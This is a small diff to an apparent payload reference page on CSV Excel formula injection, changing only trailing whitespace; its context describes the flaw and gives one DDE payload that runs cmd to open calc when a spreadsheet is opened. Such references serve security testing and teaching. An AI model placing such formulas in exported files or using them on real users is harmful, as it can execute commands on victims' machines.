@@ -1,10 +1,10 @@
 # CSV Excel formula injection
 
-Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel,Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.	
+Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel,Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.
 
 ## Exploit
 
-Basic exploit with Dynamic Data Exchange 
+Basic exploit with Dynamic Data Exchange
 
 ```powershell
 DDE ("cmd";"/C calc";"!A0")A0
